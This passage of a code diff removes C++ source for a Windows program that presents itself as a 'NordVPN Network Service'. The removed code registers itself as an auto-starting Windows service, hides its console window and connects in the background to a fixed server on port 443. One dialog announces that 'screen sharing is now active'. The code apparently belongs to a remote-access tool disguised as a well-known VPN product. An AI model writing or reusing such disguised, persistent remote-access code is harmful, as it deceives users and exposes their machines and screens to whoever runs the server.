-        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-        g_ServiceStatus.dwWin32ExitCode = ERROR_NOT_ENOUGH_MEMORY;
-        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-        return;
-    }
-    
-    // Load configuration
-    LoadServiceConfig();
-    
-    // Start worker thread
-    HANDLE hWorkerThread = CreateThread(nullptr, 0, ServiceWorkerThread, nullptr, 0, nullptr);
-    if (hWorkerThread == nullptr) {
-        CloseHandle(g_ServiceStopEvent);
-        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-        g_ServiceStatus.dwWin32ExitCode = ERROR_NOT_ENOUGH_MEMORY;
-        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-        return;
-    }
-    
-    // Service is now running
-    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    g_ServiceStatus.dwCheckPoint = 0;
-    g_ServiceStatus.dwWaitHint = 0;
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-    
-    // Wait for stop event
-    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
-    
-    // Cleanup
-    CloseHandle(hWorkerThread);
-    CloseHandle(g_ServiceStopEvent);
-    
-    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-    g_ServiceStatus.dwCheckPoint = 0;
-    g_ServiceStatus.dwWaitHint = 0;
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-}
-
-// Service installation
-bool InstallService(const std::string& host, int port) {
-    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
-    if (hSCManager == nullptr) {
-        return false;
-    }
-    
-    wchar_t szPath[MAX_PATH];
-    if (!GetModuleFileNameW(nullptr, szPath, MAX_PATH)) {
-        CloseServiceHandle(hSCManager);
-        return false;
-    }
-    
-    SC_HANDLE hService = CreateServiceW(
-        hSCManager,
-        SERVICE_NAME,
-        SERVICE_DISPLAY_NAME,
-        SERVICE_ALL_ACCESS,
-        SERVICE_WIN32_OWN_PROCESS,
-        SERVICE_AUTO_START,
-        SERVICE_ERROR_NORMAL,
-        szPath,
-        nullptr,
-        nullptr,
-        nullptr,
-        nullptr,
-        nullptr
-    );
-    
-    if (hService == nullptr) {
-        CloseServiceHandle(hSCManager);
-        return false;
-    }
-    
-    // Set service description
-    SERVICE_DESCRIPTIONW serviceDesc;
-    serviceDesc.lpDescription = const_cast<LPWSTR>(SERVICE_DESCRIPTION);
-    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &serviceDesc);
-    
-    CloseServiceHandle(hService);
-    CloseServiceHandle(hSCManager);
-    
-    // Save configuration
-    g_config.server_host = host;
-    g_config.server_port = port;
-    SaveServiceConfig();
-    
-    return true;
-}
-
-// Service removal
-bool UninstallService() {
-    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
-    if (hSCManager == nullptr) {
-        return false;
-    }
-    
-    SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);
-    if (hService == nullptr) {
-        CloseServiceHandle(hSCManager);
-        return false;
-    }
-    
-    // Stop service if running
-    SERVICE_STATUS serviceStatus;
-    ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
-    
-    // Delete service
-    bool result = DeleteService(hService);
-    
-    CloseServiceHandle(hService);
-    CloseServiceHandle(hSCManager);
-    
-    return result;
-}
-
-// NEW: Double-click functionality - GUI mode for easy connection
-int main(int argc, char* argv[]) {
-    // CHECK FOR DOUBLE-CLICK (no command line arguments)
-    if (argc == 1) {
-        // DOUBLE-CLICK MODE: Show GUI dialogs and connect automatically
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            MessageBoxA(nullptr, "Failed to initialize networking", "NordVPN Error", MB_OK | MB_ICONERROR);
-            return 1;
-        }
-        
-        // Get server IP from user with simple dialog
-        char serverIP[256] = "192.168.88.3"; // Default value
-        
-        int choice = MessageBoxA(GetDesktopWindow(), 
-            "Select VPN server to connect to:\n\n"
-            "Yes = Network server (192.168.88.3)\n"
-            "No = Local server (127.0.0.1)\n"
-            "Cancel = Exit",
-            "NordVPN Network Service - Server Selection", 
-            MB_YESNOCANCEL | MB_ICONQUESTION);
-        
-        if (choice == IDCANCEL) {
-            WSACleanup();
-            return 0;
-        } else if (choice == IDNO) {
-            strcpy_s(serverIP, sizeof(serverIP), "127.0.0.1");
-        }
-        // else keep default 192.168.88.3
-        
-        // Allocate console for background logging (hidden)
-        AllocConsole();
-        FILE* pCout;
-        freopen_s(&pCout, "CONOUT$", "w", stdout);
-        
-        // Hide console window for background operation
-        ShowWindow(GetConsoleWindow(), SW_HIDE);
-        
-        std::cout << "[+] Starting VPN tunnel client in background mode..." << std::endl;
-        std::cout << "[+] Connecting to: " << serverIP << ":443" << std::endl;
-        
-        VPNTunnelClient client(std::string(serverIP), 443);
-        
-        // Create a fake stop event for GUI mode
-        g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
-        
-        // Show connection attempt notification
-        std::string connectMsg = "Connecting to VPN server: " + std::string(serverIP) + ":443\n\n"
-                                "The client will now run in the background.\n"
-                                "Screen sharing is now active.";
-        
-        MessageBoxA(nullptr, connectMsg.c_str(),
-            "NordVPN Network Service - Connected", 
-            MB_OK | MB_ICONINFORMATION);
-        
-        // Run the VPN client
-        client.run();
-        
-        if (pCout) fclose(pCout);
-        FreeConsole();
-        WSACleanup();
-        return 0;
-    }
-    
-    // COMMAND LINE MODE: Handle service installation and advanced options
-    if (argc > 1) {
-        std::string command = argv[1];
-        
-        if (command == "install" && argc == 4) {
-            std::string host = argv[2];
-            int port = std::stoi(argv[3]);
-            
-            if (InstallService(host, port)) {
-                std::cout << "Service installed successfully.\n";
-                std::cout << "Server: " << host << ":" << port << "\n";
-                std::cout << "Use 'net start " << "NordVPNService" << "' to start the service.\n";
-                return 0;
-            } else {
-                std::cout << "Failed to install service. Run as administrator.\n";
-                return 1;
-            }
-        }
-        else if (command == "uninstall") {
-            if (UninstallService()) {
-                std::cout << "Service uninstalled successfully.\n";
-                return 0;
-            } else {
-                std::cout << "Failed to uninstall service.\n";
-                return 1;
-            }
-        }
-        else if (command == "console" && argc == 4) {
-            // Run in console mode for testing
-            WSADATA wsaData;
-            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-                std::cout << "Failed to initialize Winsock" << std::endl;
-                return 1;
-            }
-            
-            std::string host = argv[2];
-            int port = std::stoi(argv[3]);
-            
-            std::cout << "Running in console mode...\n";
-            std::cout << "Connecting to: " << host << ":" << port << std::endl;
-            
-            VPNTunnelClient client(host, port);
-            
-            // Create a fake stop event for console mode
-            g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
-            
-            client.run();
-            
-            WSACleanup();
-            return 0;
-        }
-    }
-    
-    // HELP MODE: Show usage information
-    std::cout << "NordVPN Network Service\n\n";
-    std::cout << "Usage:\n";
-    std::cout << "  " << argv[0] << "                                        - GUI mode (double-click)\n";
-    std::cout << "  " << argv[0] << " install <server_host> <server_port>   - Install as Windows service\n";
-    std::cout << "  " << argv[0] << " uninstall                             - Remove service\n";
-    std::cout << "  " << argv[0] << " console <server_host> <server_port>   - Run in console mode\n\n";
-    std::cout << "Examples:\n";
-    std::cout << "  Double-click client.exe for easy connection\n";
-    std::cout << "  " << argv[0] << " install 192.168.88.3 443\n";
-    std::cout << "  " << argv[0] << " console 127.0.0.1 443\n";
-    
-    // Check if running as service
-    SERVICE_TABLE_ENTRYW ServiceTable[] = {
-        {const_cast<LPWSTR>(SERVICE_NAME), ServiceMain},
-        {nullptr, nullptr}
-    };
-    
-    if (StartServiceCtrlDispatcherW(ServiceTable) == FALSE) {
-        return GetLastError();
-    }
-    
     return 0;
 }
